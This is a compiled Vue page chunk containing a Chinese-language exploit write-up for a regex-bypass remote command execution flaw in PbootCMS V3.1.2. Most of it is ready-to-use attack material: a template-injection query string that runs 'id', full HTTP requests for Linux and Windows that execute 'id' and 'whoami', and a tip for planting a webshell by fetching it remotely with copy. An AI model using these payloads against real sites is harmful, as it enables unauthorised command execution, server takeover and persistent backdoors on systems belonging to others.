import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const t={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>PbootCMS 项目路径下 /common/function.php 中存在两个函数 get_lg 和 get_backurl，可绕过正则处理，进而执行命令。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>Bypass exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&amp;backurl=;id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Linux exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&amp;backurl=;id HTTP/1.1
Host: your-ip
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: your-ip
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: lg=system; PbootSystem=8ea446nv2usihctikbjm7qg6c6
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Windows exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/(&quot;whoami&quot;))}{/pboot:if} HTTP/1.1
Host: your-ip
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer:your-ip
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: lg=system; PbootSystem=8ea446nv2usihctikbjm7qg6c6
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>写 <code>webshell</code> 时用 <code>file_put_contents</code> 写入时有关键字限制：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230601112738897.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可使用 <code>copy</code> 函数远程落地。</p>`,12),d=[s];function l(c,o){return i(),n("div",null,d)}const u=e(t,[["render",l],["__file","PbootCMS V3.1.2 正则绕过 RCE 漏洞.html.vue"]]);export{u as default};
